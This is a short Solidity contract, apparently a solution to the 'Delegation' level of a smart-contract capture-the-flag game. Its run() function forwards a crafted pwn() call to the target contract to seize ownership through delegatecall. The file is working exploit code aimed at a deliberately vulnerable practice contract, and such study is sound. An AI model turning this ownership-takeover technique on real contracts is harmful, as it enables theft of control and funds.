// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '../levels/Delegation.sol';

contract DelegationAttack {

    Delegation delegation;

    constructor(address _delegation) public {
        delegation = Delegation(_delegation);
    }

    function run() public {
        bytes memory selector = abi.encodeWithSignature("pwn()");
        address(delegation).call(selector);
    }
}
